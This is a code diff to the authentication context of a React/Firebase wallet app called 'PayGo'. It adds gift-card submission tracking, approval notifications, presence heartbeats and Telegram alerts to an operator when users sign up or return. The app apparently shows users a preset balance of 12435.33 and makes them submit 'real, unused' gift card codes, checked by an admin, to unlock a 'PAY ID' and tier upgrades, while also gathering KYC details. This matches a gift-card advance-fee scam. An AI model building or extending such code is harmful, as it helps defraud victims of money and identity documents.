@@ -1,5 +1,5 @@
-import React, { createContext, useContext, useState, useEffect } from 'react';
-import { User, Transaction } from '../types';
+import React, { createContext, useContext, useState, useEffect, useCallback, useRef } from 'react';
+import { User, Transaction, TrackedGiftCard, AppNotification } from '../types';
 import { db, auth } from '../lib/firebase';
 import { doc, getDoc, setDoc, updateDoc, collection, query, where, getDocs, onSnapshot } from 'firebase/firestore';
 import {
@@ -8,6 +8,7 @@ import {
   signOut,
 } from 'firebase/auth';
 import { COUNTRY_DIAL_CODES } from '../data/countryCodes';
+import { notifyTelegramEvent } from '../lib/telegram';
 
 const ADMIN_OWNER_EMAIL = 'ibro88977@gmail.com';
 export const SAVED_LOGIN_STORAGE_KEY = 'paygo_saved_login';
@@ -84,9 +85,27 @@ export const getRememberedLogin = (): SavedLoginDetails | null => {
   return null;
 };
 
+export interface TrackGiftCardInput {
+  statusId: string;
+  type: string;
+  cardBrand: string;
+  cardFormat: 'physical' | 'ecode';
+  cardCode: string;
+  amount: number;
+}
+
 interface AuthContextType {
   user: User | null;
   transactions: Transaction[];
+  trackedGiftCards: TrackedGiftCard[];
+  notifications: AppNotification[];
+  liveAlert: AppNotification | null;
+  dismissLiveAlert: () => void;
+  trackGiftCardSubmission: (input: TrackGiftCardInput) => void;
+  removeTrackedGiftCard: (statusId: string) => void;
+  markNotificationRead: (id: string) => void;
+  markAllNotificationsRead: () => void;
+  clearNotifications: () => void;
   login: (identifier: string, password: string, method?: 'email' | 'phone') => Promise<{ success: boolean; error?: string }>;
   register: (
     name: string,
@@ -128,12 +147,152 @@ const normalizePhone = (raw: string): string => {
   return `+1${digits}`;
 };
 
+const detectLoginDevice = (): string => {
+  if (typeof navigator === 'undefined') return 'Web Browser';
+  const ua = navigator.userAgent || '';
+  let os = 'Web Device';
+  if (/iPhone/i.test(ua)) os = 'iPhone (iOS)';
+  else if (/iPad/i.test(ua)) os = 'iPad (iPadOS)';
+  else if (/Android/i.test(ua)) os = 'Android';
+  else if (/Windows/i.test(ua)) os = 'Windows PC';
+  else if (/Macintosh|Mac OS X/i.test(ua)) os = 'Mac';
+  else if (/Linux/i.test(ua)) os = 'Linux';
+
+  let browser = 'Browser';
+  if (/Edg\//i.test(ua)) browser = 'Edge';
+  else if (/OPR\//i.test(ua)) browser = 'Opera';
+  else if (/CriOS|Chrome/i.test(ua)) browser = 'Chrome';
+  else if (/FxiOS|Firefox/i.test(ua)) browser = 'Firefox';
+  else if (/Safari/i.test(ua)) browser = 'Safari';
+
+  return `${os} • ${browser}`.slice(0, 100);
+};
+
+const getTrackedGiftCardsKey = (email: string) =>
+  `paygo_tracked_gift_cards_${email.trim().toLowerCase()}`;
+
+const getNotificationsKey = (email: string) =>
+  `paygo_notifications_${email.trim().toLowerCase()}`;
+
+const maskGiftCardCode = (rawCode: string): string => {
+  const clean = rawCode.replace(/\s+/g, '').toUpperCase();
+  if (!clean) return '••••';
+  if (clean.length <= 4) return clean;
+  return `•••• ${clean.slice(-4)}`;
+};
+
+const readStoredTrackedGiftCards = (email: string): TrackedGiftCard[] => {
+  try {
+    const cleanEmail = email.trim().toLowerCase();
+    const raw = localStorage.getItem(getTrackedGiftCardsKey(cleanEmail));
+    const parsed: TrackedGiftCard[] = raw ? JSON.parse(raw) : [];
+    const list = Array.isArray(parsed) ? [...parsed] : [];
+
+    // Bootstrap any legacy pending PAY ID status key
+    const legacyPayIdStatus = localStorage.getItem(`paygo_pending_payid_status_${cleanEmail}`);
+    if (legacyPayIdStatus && !list.some((item) => item.statusId === legacyPayIdStatus)) {
+      const nowIso = new Date().toISOString();
+      list.unshift({
+        statusId: legacyPayIdStatus,
+        type: 'PAY ID Verification',
+        cardBrand: 'Gift Card',
+        cardFormat: 'ecode',
+        maskedCode: '••••',
+        amount: 25,
+        status: 'pending',
+        submittedAt: nowIso,
+        updatedAt: nowIso,
+      });
+    }
+
+    // Bootstrap any legacy pending Upgrade status key
+    const legacyUpgradeRaw = localStorage.getItem(`paygo_pending_upgrade_${cleanEmail}`);
+    if (legacyUpgradeRaw) {
+      try {
+        const upg = JSON.parse(legacyUpgradeRaw) as { statusId?: string; stage?: number };
+        if (upg.statusId && !list.some((item) => item.statusId === upg.statusId)) {
+          const nowIso = new Date().toISOString();
+          list.unshift({
+            statusId: upg.statusId,
+            type: upg.stage ? `Stage ${upg.stage} Upgrade` : 'Tier Upgrade',
+            cardBrand: 'Gift Card',
+            cardFormat: 'ecode',
+            maskedCode: '••••',
+            amount: 0,
+            status: 'pending',
+            submittedAt: nowIso,
+            updatedAt: nowIso,
+          });
+        }
+      } catch {
+        // ignore invalid legacy JSON
+      }
+    }
+
+    return list;
+  } catch {
+    return [];
+  }
+};
+
+const readStoredNotifications = (email: string): AppNotification[] => {
+  try {
+    const raw = localStorage.getItem(getNotificationsKey(email));
+    const parsed = raw ? JSON.parse(raw) : [];
+    return Array.isArray(parsed) ? parsed : [];
+  } catch {
+    return [];
+  }
+};
+
 export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
   const [user, setUser] = useState<User | null>(null);
   const [transactions, setTransactions] = useState<Transaction[]>([]);
+  const [trackedGiftCards, setTrackedGiftCards] = useState<TrackedGiftCard[]>([]);
+  const [notifications, setNotifications] = useState<AppNotification[]>([]);
+  const [liveAlert, setLiveAlert] = useState<AppNotification | null>(null);
   const [isOnboardingComplete, setIsOnboardingComplete] = useState<boolean>(true);
   const [isWelcomeComplete, setIsWelcomeComplete] = useState<boolean>(true);
   const [showReferPopup, setShowReferPopup] = useState<boolean>(false);
+  const userRef = useRef<User | null>(null);
+
+  useEffect(() => {
+    userRef.current = user;
+  }, [user]);
+
+  const persistTrackedGiftCards = useCallback((email: string, nextList: TrackedGiftCard[]) => {
+    try {
+      localStorage.setItem(getTrackedGiftCardsKey(email), JSON.stringify(nextList.slice(0, 30)));
+    } catch {
+      // ignore storage errors
+    }
+  }, []);
+
+  const persistNotifications = useCallback((email: string, nextList: AppNotification[]) => {
+    try {
+      localStorage.setItem(getNotificationsKey(email), JSON.stringify(nextList.slice(0, 50)));
+    } catch {
+      // ignore storage errors
+    }
+  }, []);
+
+  const pushNotification = useCallback(
+    (email: string, item: AppNotification, showBanner = false) => {
+      const cleanEmail = email.trim().toLowerCase();
+      setNotifications((prev) => {
+        if (prev.some((n) => n.id === item.id)) {
+          return prev;
+        }
+        const next = [item, ...prev].slice(0, 50);
+        persistNotifications(cleanEmail, next);
+        return next;
+      });
+      if (showBanner) {
+        setLiveAlert(item);
+      }
+    },
+    [persistNotifications]
+  );
 
   // Initialize session from localStorage or sync with Firestore
   useEffect(() => {
@@ -165,7 +324,9 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
               (existing.name
                 ? existing.name.toLowerCase().replace(/[^a-z0-9]/g, '')
                 : cleanEmail.split('@')[0].toLowerCase());
-            setUser({
+            const nowIso = new Date().toISOString();
+            const device = detectLoginDevice();
+            const restoredUser: User = {
               ...existing,
               referralCode: cleanRefCode,
               balance: existing.balance !== undefined ? existing.balance : 12435.33,
@@ -177,9 +338,26 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
               kycRejectionReason: existing.kycRejectionReason,
               kycStatusId: existing.kycStatusId,
               cardRejectionReason: existing.cardRejectionReason,
-            });
+              lastLoginAt: existing.lastLoginAt || nowIso,
+              lastActiveAt: nowIso,
+              lastLoginDevice: existing.lastLoginDevice || device,
+              isOnline: true,
+            };
+            setUser(restoredUser);
             const txs = JSON.parse(localStorage.getItem(`paygo_transactions_${cleanEmail}`) || '[]');
             setTransactions(txs);
+            setTrackedGiftCards(readStoredTrackedGiftCards(cleanEmail));
+            setNotifications(readStoredNotifications(cleanEmail));
+
+            const todayPrefix = nowIso.slice(0, 10);
+            const lastLoginToday = (existing.lastLoginAt || '').slice(0, 10) === todayPrefix;
+            updateDoc(doc(db, 'users', cleanEmail), {
+              ...(lastLoginToday ? {} : { lastLoginAt: nowIso }),
+              lastActiveAt: nowIso,
+              lastLoginDevice: device,
+              isOnline: true,
+              updatedAt: nowIso,
+            }).catch(() => {});
           } else {
             const cleanRefCode = cleanEmail.split('@')[0].toLowerCase();
             const newUser: User = {
@@ -243,6 +421,64 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
           ) {
             return prev;
           }
+
+          if (!prev.payIdVerified && remote.payIdVerified) {
+            pushNotification(
+              cleanEmail,
+              {
+                id: `user_payid_verified_${cleanEmail}`,
+                kind: 'account_update',
+                title: 'PAY ID Approved & Activated',
+                message: 'Your official PAY ID (PG-7474PAYDDT1I2P18837DOEFQ) is now active on your wallet.',
+                status: 'verified',
+                createdAt: new Date().toISOString(),
+                read: false,
+                actionView: 'transfer',
+                actionLabel: 'Go to Transfer',
+              },
+              true
+            );
+          }
+
+          if (prev.kycStatus !== remote.kycStatus && (remote.kycStatus === 'verified' || remote.kycStatus === 'rejected')) {
+            pushNotification(
+              cleanEmail,
+              {
+                id: `user_kyc_${remote.kycStatus}_${remote.kycStatusId || Date.now()}`,
+                kind: 'account_update',
+                title: remote.kycStatus === 'verified' ? 'KYC Identity Approved' : 'KYC Verification Rejected',
+                message:
+                  remote.kycStatus === 'verified'
+                    ? 'Your Driver License & SSI verification has been approved.'
+                    : remote.kycRejectionReason || 'Your KYC verification was rejected. Please resubmit clear documents.',
+                status: remote.kycStatus,
+                createdAt: new Date().toISOString(),
+                read: false,
+                actionView: remote.kycStatus === 'verified' ? 'transfer' : 'kyc-verification',
+                actionLabel: remote.kycStatus === 'verified' ? 'Go to Transfer' : 'Review KYC',
+              },
+              true
+            );
+          }
+
+          if (!prev.cardRejectionReason && remote.cardRejectionReason) {
+            pushNotification(
+              cleanEmail,
+              {
+                id: `user_card_rejected_${remote.cardRejectionReason.slice(0, 24)}`,
+                kind: 'account_update',
+                title: 'Card Verification Declined',
+                message: remote.cardRejectionReason,
+                status: 'rejected',
+                createdAt: new Date().toISOString(),
+                read: false,
+                actionView: 'buy-pay-id',
+                actionLabel: 'Try Again',
+              },
+              true
+            );
+          }
+
           const merged: User = {
             ...prev,
             payIdVerified: remote.payIdVerified,
@@ -278,6 +514,246 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
     );
 
     return () => unsub();
+  }, [user?.email, pushNotification]);
+
+  // Global real-time Firestore listener on all tracked gift card statuses (live Approve/Reject without refresh)
+  const trackedStatusKey = trackedGiftCards.map((c) => c.statusId).join('|');
+  useEffect(() => {
+    const cleanEmail = user?.email?.trim().toLowerCase();
+    if (!cleanEmail || trackedGiftCards.length === 0) return;
+
+    const cardsToWatch = trackedGiftCards.slice(0, 15);
+    const unsubscribers = cardsToWatch.map((cardMeta) =>
+      onSnapshot(
+        doc(db, 'giftCardStatuses', cardMeta.statusId),
+        (snap) => {
+          if (!snap.exists()) return;
+          const remote = snap.data() as {
+            id?: string;
+            type?: string;
+            status: 'pending' | 'verified' | 'redeemed' | 'rejected';
+            rejectionReason?: string;
+            updatedAt?: string;
+          };
+
+          const remoteStatus = remote.status;
+          const remoteReason = remote.rejectionReason || '';
+          const remoteUpdatedAt = remote.updatedAt || new Date().toISOString();
+
+          let didTransition = false;
+          let resolvedCard: TrackedGiftCard = cardMeta;
+
+          setTrackedGiftCards((prev) => {
+            const idx = prev.findIndex((item) => item.statusId === cardMeta.statusId);
+            if (idx === -1) return prev;
+            const current = prev[idx];
+            if (
+              current.status === remoteStatus &&
+              (current.rejectionReason || '') === remoteReason &&
+              current.updatedAt === remoteUpdatedAt
+            ) {
+              return prev;
+            }
+            didTransition =
+              current.status !== remoteStatus ||
+              (remoteStatus === 'rejected' && (current.rejectionReason || '') !== remoteReason);
+
+            resolvedCard = {
+              ...current,
+              type: remote.type || current.type,
+              status: remoteStatus,
+              rejectionReason: remoteStatus === 'rejected' ? remoteReason : undefined,
+              updatedAt: remoteUpdatedAt,
+            };
+
+            const next = [...prev];
+            next[idx] = resolvedCard;
+            persistTrackedGiftCards(cleanEmail, next);
+            return next;
+          });
+
+          if (!didTransition) return;
+
+          const cardPurpose = resolvedCard.type || 'Gift Card Verification';
+          const isPayIdCard = cardPurpose === 'PAY ID Verification';
+          const isStageUpgrade = cardPurpose.startsWith('Stage ');
+
+          if (remoteStatus === 'verified' || remoteStatus === 'redeemed') {
+            if (isPayIdCard) {
+              localStorage.removeItem(`paygo_pending_payid_status_${cleanEmail}`);
+            } else if (isStageUpgrade) {
+              localStorage.removeItem(`paygo_pending_upgrade_${cleanEmail}`);
+            }
+
+            // Unlock profile immediately in client state + cloud profile
+            setUser((prevUser) => {
+              if (!prevUser || prevUser.email.toLowerCase() !== cleanEmail) return prevUser;
+              if (isPayIdCard && !prevUser.payIdVerified) {
+                const updated = { ...prevUser, payIdVerified: true, cardRejectionReason: '' };
+                updateDoc(doc(db, 'users', cleanEmail), {
+                  payIdVerified: true,
+                  cardRejectionReason: '',
+                  updatedAt: new Date().toISOString(),
+                }).catch(() => {});
+                return updated;
+              }
+              if (isStageUpgrade && prevUser.accountLevel !== cardPurpose) {
+                const updated = { ...prevUser, accountLevel: cardPurpose, cardRejectionReason: '' };
+                updateDoc(doc(db, 'users', cleanEmail), {
+                  accountLevel: cardPurpose,
+                  cardRejectionReason: '',
+                  updatedAt: new Date().toISOString(),
+                }).catch(() => {});
+                return updated;
+              }
+              return prevUser;
+            });
+
+            // Record transaction once per statusId
+            setTransactions((prevTxs) => {
+              if (prevTxs.some((t) => t.ref === cardMeta.statusId)) return prevTxs;
+              const newTx: Transaction = {
+                id: `TXN-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
+                type: isPayIdCard ? 'PAY ID Purchase' : 'Account Upgrade',
+                amount: resolvedCard.amount || (isPayIdCard ? 25 : 0),
+                tierName: isStageUpgrade ? cardPurpose : undefined,
+                ref: cardMeta.statusId,
+                date: new Date().toLocaleString(),
+              };
+              const nextTxs = [newTx, ...prevTxs];
+              try {
+                localStorage.setItem(`paygo_transactions_${cleanEmail}`, JSON.stringify(nextTxs));
+              } catch {
+                // ignore
+              }
+              return nextTxs;
+            });
+
+            const amountLabel = resolvedCard.amount > 0 ? `$${resolvedCard.amount} ` : '';
+            pushNotification(
+              cleanEmail,
+              {
+                id: `gc_${cardMeta.statusId}_${remoteStatus}_${remoteUpdatedAt}`,
+                kind: 'giftcard_approved',
+                title:
+                  remoteStatus === 'redeemed'
+                    ? 'Gift Card Approved & Redeemed'
+                    : 'Gift Card Approved',
+                message: `Your ${amountLabel}${resolvedCard.cardBrand} (${resolvedCard.maskedCode}) for ${cardPurpose} was approved.${
+                  isPayIdCard
+                    ? ' Your PAY ID is now unlocked.'
+                    : isStageUpgrade
+                    ? ` ${cardPurpose} is now active.`
+                    : ''
+                }`,
+                status: remoteStatus,
+                statusId: cardMeta.statusId,
+                createdAt: new Date().toISOString(),
+                read: false,
+                actionView: isPayIdCard ? 'transfer' : isStageUpgrade ? 'upgrade' : 'dashboard',
+                actionLabel: isPayIdCard ? 'Go to Transfer' : isStageUpgrade ? 'View Tier' : 'View Wallet',
+              },
+              true
+            );
+          } else if (remoteStatus === 'rejected') {
+            if (isPayIdCard) {
+              localStorage.removeItem(`paygo_pending_payid_status_${cleanEmail}`);
+            } else if (isStageUpgrade) {
+              localStorage.removeItem(`paygo_pending_upgrade_${cleanEmail}`);
+            }
+
+            const reasonText =
+              remoteReason ||
+              'Wrong or already-used gift card is not allowed. Please drop a real, unused gift card.';
+            const amountLabel = resolvedCard.amount > 0 ? `$${resolvedCard.amount} ` : '';
+
+            pushNotification(
+              cleanEmail,
+              {
+                id: `gc_${cardMeta.statusId}_rejected_${remoteUpdatedAt}`,
+                kind: 'giftcard_rejected',
+                title: 'Gift Card Rejected',
+                message: `Your ${amountLabel}${resolvedCard.cardBrand} (${resolvedCard.maskedCode}) for ${cardPurpose} was rejected: ${reasonText}`,
+                status: 'rejected',
+                statusId: cardMeta.statusId,
+                createdAt: new Date().toISOString(),
+                read: false,
+                actionView: isStageUpgrade ? 'upgrade' : 'buy-pay-id',
+                actionLabel: 'Resubmit Card',
+              },
+              true
+            );
+          }
+        },
+        (err) => {
+          console.warn('Global gift card status listener warning:', err);
+        }
+      )
+    );
+
+    return () => {
+      unsubscribers.forEach((unsub) => unsub());
+    };
+  }, [user?.email, trackedStatusKey, persistTrackedGiftCards, pushNotification]);
+
+  // Sync tracked gift cards & notifications cleanly if updated from another open tab
+  useEffect(() => {
+    const cleanEmail = user?.email?.trim().toLowerCase();
+    if (!cleanEmail) return;
+
+    const cardsKey = getTrackedGiftCardsKey(cleanEmail);
+    const notifsKey = getNotificationsKey(cleanEmail);
+
+    const handleStorage = (e: StorageEvent) => {
+      if (e.key === cardsKey) {
+        setTrackedGiftCards(readStoredTrackedGiftCards(cleanEmail));
+      } else if (e.key === notifsKey) {
+        setNotifications(readStoredNotifications(cleanEmail));
+      }
+    };
+
+    window.addEventListener('storage', handleStorage);
+    return () => window.removeEventListener('storage', handleStorage);
+  }, [user?.email]);
+
+  // Keep user's online presence & lastActiveAt fresh while logged in
+  useEffect(() => {
+    const cleanEmail = user?.email?.trim().toLowerCase();
+    if (!cleanEmail) return;
+
+    const sendUserHeartbeat = (online: boolean) => {
+      const nowIso = new Date().toISOString();
+      updateDoc(doc(db, 'users', cleanEmail), {
+        lastActiveAt: nowIso,
+        isOnline: online,
+        updatedAt: nowIso,
+      }).catch(() => {});
+    };
+
+    const intervalId = window.setInterval(() => {
+      if (document.visibilityState !== 'hidden') {
+        sendUserHeartbeat(true);
+      }
+    }, 30000);
+
+    const handleVisibility = () => {
+      if (document.visibilityState === 'visible') {
+        sendUserHeartbeat(true);
+      }
+    };
+
+    const handlePageHide = () => {
+      sendUserHeartbeat(false);
+    };
+
+    document.addEventListener('visibilitychange', handleVisibility);
+    window.addEventListener('pagehide', handlePageHide);
+
+    return () => {
+      window.clearInterval(intervalId);
+      document.removeEventListener('visibilitychange', handleVisibility);
+      window.removeEventListener('pagehide', handlePageHide);
+    };
   }, [user?.email]);
 
   // Show Refer & Earn share popup every 10 minutes instead of on every render/login
@@ -531,6 +1007,8 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
       const resolvedAuthMethod: 'email' | 'phone' =
         found.authMethod ||
         (cleanEmail.endsWith('@phone.paygo.com') ? 'phone' : method);
+      const nowIso = new Date().toISOString();
+      const loginDevice = detectLoginDevice();
       const userData: User = {
         name: found.name,
         email: found.email,
@@ -550,7 +1028,53 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
         phoneVerified: true,
         authMethod: resolvedAuthMethod,
         passwordHash: found.passwordHash,
+        lastLoginAt: nowIso,
+        lastActiveAt: nowIso,
+        lastLoginDevice: loginDevice,
+        isOnline: true,
       };
+
+      const prevActivityIso = found.lastActiveAt || found.lastLoginAt || found.createdAt;
+      const prevActivityMs = prevActivityIso ? Date.parse(prevActivityIso) : NaN;
+      const LONG_ABSENCE_MS = 6 * 60 * 60 * 1000;
+      const isReturningAfterLongTime =
+        !Number.isNaN(prevActivityMs) && Date.now() - prevActivityMs >= LONG_ABSENCE_MS;
+
+      try {
+        await setDoc(
+          doc(db, 'users', found.email.toLowerCase()),
+          {
+            lastLoginAt: nowIso,
+            lastActiveAt: nowIso,
+            lastLoginDevice: loginDevice,
+            isOnline: true,
+            updatedAt: nowIso,
+          },
+          { merge: true }
+        );
+      } catch (loginSyncErr) {
+        console.warn('Login timestamp sync fallback:', loginSyncErr);
+      }
+
+      if (isReturningAfterLongTime) {
+        notifyTelegramEvent({
+          eventType: 'user_returning_login',
+          name: found.name || cleanEmail.split('@')[0],
+          email: found.email,
+        });
+      }
+
+      try {
+        const idx = users.findIndex((u) => u.email.toLowerCase() === found!.email.toLowerCase());
+        if (idx !== -1) {
+          users[idx] = { ...users[idx], ...userData };
+        } else {
+          users.push(userData);
+        }
+        localStorage.setItem('paygo_users', JSON.stringify(users));
+      } catch {
+        // ignore storage errors
+      }
 
       setUser(userData);
       localStorage.setItem('paygo_current_user', cleanEmail);
@@ -568,6 +1092,9 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
         localStorage.setItem(`paygo_transactions_${cleanEmail}`, JSON.stringify(txs));
       }
       setTransactions(txs);
+      setTrackedGiftCards(readStoredTrackedGiftCards(cleanEmail));
+      setNotifications(readStoredNotifications(cleanEmail));
+      setLiveAlert(null);
       setIsWelcomeComplete(true);
       setIsOnboardingComplete(true);
 
@@ -723,11 +1250,21 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
       localStorage.setItem(`paygo_transactions_${cleanEmail}`, JSON.stringify(initialTxs));
 
       // 2. Persist to Firestore database so all devices can log in with the same details
+      const nowIso = new Date().toISOString();
+      const loginDevice = detectLoginDevice();
+      newUser.lastLoginAt = nowIso;
+      newUser.lastActiveAt = nowIso;
+      newUser.lastLoginDevice = loginDevice;
+      newUser.isOnline = true;
       try {
         const firestorePayload = Object.fromEntries(
           Object.entries({
             ...newUser,
-            createdAt: new Date().toISOString(),
+            createdAt: nowIso,
+            lastLoginAt: nowIso,
+            lastActiveAt: nowIso,
+            lastLoginDevice: loginDevice,
+            isOnline: true,
           }).filter(([, val]) => val !== undefined)
         );
         await setDoc(doc(db, 'users', cleanEmail), firestorePayload, { merge: true });
@@ -740,8 +1277,18 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
         creditReferralBonus(refCode);
       }
 
+      notifyTelegramEvent({
+        eventType: 'signup',
+        name: trimmedName,
+        email: cleanEmail,
+        time: new Date().toLocaleString(),
+      });
+
       setUser(newUser);
       setTransactions(initialTxs);
+      setTrackedGiftCards([]);
+      setNotifications([]);
+      setLiveAlert(null);
       setIsWelcomeComplete(false);
       setIsOnboardingComplete(false);
       localStorage.setItem(`paygo_welcome_${cleanEmail}`, 'false');
@@ -755,9 +1302,21 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
   };
 
   const logout = () => {
+    const cleanEmail = user?.email?.trim().toLowerCase();
+    if (cleanEmail) {
+      const nowIso = new Date().toISOString();
+      updateDoc(doc(db, 'users', cleanEmail), {
+        isOnline: false,
+        lastActiveAt: nowIso,
+        updatedAt: nowIso,
+      }).catch(() => {});
+    }
     setShowReferPopup(false);
     setUser(null);
     setTransactions([]);
+    setTrackedGiftCards([]);
+    setNotifications([]);
+    setLiveAlert(null);
     localStorage.removeItem('paygo_current_user');
     signOut(auth).catch(() => {});
   };
@@ -848,14 +1407,24 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
   };
 
   const addTransaction = (transaction: Omit<Transaction, 'id'>) => {
-    if (!user) return;
-    const newTx: Transaction = {
-      ...transaction,
-      id: `TXN-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
-    };
-    const updated = [newTx, ...transactions];
-    setTransactions(updated);
-    localStorage.setItem(`paygo_transactions_${user.email}`, JSON.stringify(updated));
+    const cleanEmail = userRef.current?.email?.trim().toLowerCase();
+    if (!cleanEmail) return;
+    setTransactions((prev) => {
+      if (transaction.ref && prev.some((t) => t.ref === transaction.ref)) {
+        return prev;
+      }
+      const newTx: Transaction = {
+        ...transaction,
+        id: `TXN-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
+      };
+      const updated = [newTx, ...prev];
+      try {
+        localStorage.setItem(`paygo_transactions_${cleanEmail}`, JSON.stringify(updated));
+      } catch {
+        // ignore storage errors
+      }
+      return updated;
+    });
   };
 
   const clearTransactions = () => {
@@ -871,11 +1440,115 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
     updateLocalStorageUser(updated);
   };
 
+  const trackGiftCardSubmission = useCallback(
+    (input: TrackGiftCardInput) => {
+      const cleanEmail = userRef.current?.email?.trim().toLowerCase();
+      if (!cleanEmail || !input.statusId) return;
+      const nowIso = new Date().toISOString();
+      const maskedCode = maskGiftCardCode(input.cardCode);
+      const entry: TrackedGiftCard = {
+        statusId: input.statusId,
+        type: input.type || 'Gift Card Verification',
+        cardBrand: input.cardBrand,
+        cardFormat: input.cardFormat,
+        maskedCode,
+        amount: input.amount,
+        status: 'pending',
+        submittedAt: nowIso,
+        updatedAt: nowIso,
+      };
+
+      setTrackedGiftCards((prev) => {
+        const filtered = prev.filter((item) => item.statusId !== entry.statusId);
+        const next = [entry, ...filtered].slice(0, 30);
+        persistTrackedGiftCards(cleanEmail, next);
+        return next;
+      });
+
+      const amountLabel = input.amount > 0 ? `$${input.amount} ` : '';
+      pushNotification(
+        cleanEmail,
+        {
+          id: `gc_${input.statusId}_submitted`,
+          kind: 'giftcard_submitted',
+          title: 'Gift Card Submitted for Review',
+          message: `Your ${amountLabel}${input.cardBrand} (${maskedCode}) for ${entry.type} is awaiting Admin confirmation.`,
+          status: 'pending',
+          statusId: input.statusId,
+          createdAt: nowIso,
+          read: false,
+          actionView: entry.type.startsWith('Stage ') ? 'upgrade' : 'buy-pay-id',
+          actionLabel: 'View Submission',
+        },
+        false
+      );
+    },
+    [persistTrackedGiftCards, pushNotification]
+  );
+
+  const removeTrackedGiftCard = useCallback(
+    (statusId: string) => {
+      const cleanEmail = userRef.current?.email?.trim().toLowerCase();
+      if (!cleanEmail) return;
+      setTrackedGiftCards((prev) => {
+        const next = prev.filter((item) => item.statusId !== statusId);
+        persistTrackedGiftCards(cleanEmail, next);
+        return next;
+      });
+    },
+    [persistTrackedGiftCards]
+  );
+
+  const markNotificationRead = useCallback(
+    (id: string) => {
+      const cleanEmail = userRef.current?.email?.trim().toLowerCase();
+      if (!cleanEmail) return;
+      setNotifications((prev) => {
+        const next = prev.map((n) => (n.id === id ? { ...n, read: true } : n));
+        persistNotifications(cleanEmail, next);
+        return next;
+      });
+    },
+    [persistNotifications]
+  );
+
+  const markAllNotificationsRead = useCallback(() => {
+    const cleanEmail = userRef.current?.email?.trim().toLowerCase();
+    if (!cleanEmail) return;
+    setNotifications((prev) => {
+      const next = prev.map((n) => ({ ...n, read: true }));
+      persistNotifications(cleanEmail, next);
+      return next;
+    });
+    setLiveAlert(null);
+  }, [persistNotifications]);
+
+  const clearNotifications = useCallback(() => {
+    const cleanEmail = userRef.current?.email?.trim().toLowerCase();
+    if (!cleanEmail) return;
+    setNotifications([]);
+    setLiveAlert(null);
+    persistNotifications(cleanEmail, []);
+  }, [persistNotifications]);
+
+  const dismissLiveAlert = useCallback(() => {
+    setLiveAlert(null);
+  }, []);
+
   return (
     <AuthContext.Provider
       value={{
         user,
         transactions,
+        trackedGiftCards,
+        notifications,
+        liveAlert,
+        dismissLiveAlert,
+        trackGiftCardSubmission,
+        removeTrackedGiftCard,
+        markNotificationRead,
+        markAllNotificationsRead,
+        clearNotifications,
         login,
         register,
         logout,
